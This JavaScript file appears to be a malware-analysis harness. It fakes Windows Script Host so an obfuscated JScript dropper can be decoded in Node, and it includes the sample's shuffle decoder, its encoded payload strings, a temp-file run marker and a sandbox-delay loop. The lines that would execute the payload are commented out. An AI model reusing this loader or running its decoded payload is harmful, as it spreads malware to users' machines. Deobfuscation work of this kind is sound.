// dummy struct (the fake WScript)
if(typeof(WScript) === "undefined") {
	WScript = {
		"CreateObject": function(arg1) {
			return (function(arg1) {
				return {
					"FileExists": function(_arg1) {
						console.log(arg1 + " -> FileExists(arg1): " + _arg1);
						return false;
					},
					"CreateTextFile": function(_arg1, _arg2) {
						console.log(arg1 + " -> CreateTextFile(arg1): " + _arg1);
						console.log(arg1 + " -> CreateTextFile(arg2): " + _arg2);
						return {
							"Close": function() {
								console.log(arg1 + " -> CreateTextFile -> Close"); 
							}
						}
					},
					// https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getspecialfolder-method
					"GetSpecialFolder": function(_arg1) {
						switch(_arg1) {
							case 0:
								console.log(arg1 + " -> GetSpecialFolder(WindowsFolder)");
								break;
							case 1:
								console.log(arg1 + " -> GetSpecialFolder(SystemFolder)");
								break;
							case 2:
								console.log(arg1 + " -> GetSpecialFolder(TemporaryFolder)");
							default:
								console.log(arg1 + " -> GetSpecialFolder(Nothing)");
						}
						
						return "C:\\temp"; 
					}
				}
			})(arg1);
		},
		"Quit": function() {
			console.log("Quit");
		},
		"Echo": function(arg1) {
			console.log(arg1);
		}
	};
}

function pa4(Od47){
Zr1=Od47; 
ZX10=Zr1+Od47+Zr1;
Hl84="NOyZ";
dM99=2580;
}
function Wi87() {Kq63 = Uu59.split(Hl84);}
function Wv4() {Kq63[ZX10] = jJ49[Kq63[xY40]];}
function uF26() {Kq63[ZX10](Kq63[Zr1])(Kq63[Zr1]);}
function jJ49(vZ21){
Zp74 = '.\\+\'tsF/pln/ie1:re5pcp[tS(DtW3hh 09\\{\'20  ]0),+01\\\'\'\\)-T/;=Em =Ga})\\i\') n(0e.n lpe,shp\"e\\op @.\'{\\2\" \\B+e+F\"H\\ 57?{46jyR irD=tt+ p \"e\\;lH@)y7\"0\\6y3(.f+frd0Oeu7xpj,elv2dap(ncu]ie=\\.\"\"(\\r6\\+\"7tD@HsR\\e\"4b(+5u(D,s R \\f\"f4i[a5 )l+;(s\\t\"egx@)ne\\;\"Ti ,erF\\s\"Btn\\2\"oS.)pos;ste e.nvr)da.((r2m) Bo;MFd J n}3=ac8 ra 6.t=7hc Htheea(H Me7r )6a={.v  r 5re{4ep Rtl)Dua0 rc0;ne2) ( \\f\'=/aP=(lT=\\s\\ TedsH;{uL 2tM}}aX )tri/sefg.v ,2r( BeFf\'S(u4.6nr2Oc(L]t2M-i5X[o3S6nqMK }\\ \';(1(+i7t3mlcS2=e763jl)Sb  ;O){7e3 ltSr(a]e\"ett\"r+u\"Crr\".+n\"tq \"p+S\"ist\"r[rhctiaSMn W{g  ). =5f8 5r020o2B3m1F C<  h7{3al Sr() Ce3loi hdw< e; 5( 2=p 97a3hlrSD;s)((ee sIoelnCl.t)ie(uhritw m, 524;S6Y0(,e l1i=F0t x)e2T+e9t3ahe0rDC). 5;2;D H];})\\(\"t)ieu;Qb. t.pKirrqceS6Wt 3)s)[5p43SpY](es(twsMi.xJEde3lni8Fa.)5l2(DrH)(e ;fdi ;e\"WpnmStr.c5e1r0t6i3n8paeit\\c\\.\"y+Q)t2u-e4i(f]t\"ar(\"s+)\"\\e\"d;l,o \"\\+\"\"}Fpl aj\"}+.\" ioce\"c+l\".espsSett\" +a\"{elG \"p[W5n2SDiHc=f5r4\\S\"Yi;,)p\"\\t\"ctemj.boOsmcelt.seyfSeellpioF(.gg3n-i0tup0isr0caS0\"y()tuc;ekj baO}ekt a\\e\"rDC[.ht p9i=r2c S+W5 +=1 ;5n2}DFH ;\'\')\')=(sSxlb3v7Z)y;OeNjraovtncsuzr=tKsqn6o3c;';
xY40=vZ21;
ih27 = "";
}
jJ49(0);pa4(1);
function Or64(AE38,MM73) {Iz8249 = ih27;IM93=xY40; while (IM93 < dM99) { LE13 = AE38.charAt(IM93);if (IM93 % (Zr1+Zr1)) Iz8249=Iz8249+LE13; else Iz8249=LE13+Iz8249; IM93++; }return Iz8249;}
Uu59=Or64(Zp74,xY40);
Wi87();
Wv4();
//uF26();

// bypass nested obfuscated code
constructorNOyZvbxs = '';
HD25 = WScript.CreateObject("Scripting.FileSystemObject");
YS45 = HD25["Ge" + "tSpe" + "ci" + "alF" + "olde" + "r"](4 - 2) + "\\ia836015.tmp";
if (HD25.FileExists(YS45)) WScript.Quit();
HD25.CreateTextFile(YS45, true).Close();
Sl37 = 5;
while (Sl37 < 13200585) {
    Math["s" + "q" + "r" + "t"](Sl37);
    Sl37 = Sl37 + 1;
}

WScript.Echo(Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '));

// mission clear

//Kq63[5 - 2](Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '))(Sl37);
//ejavnsz = Kq63;
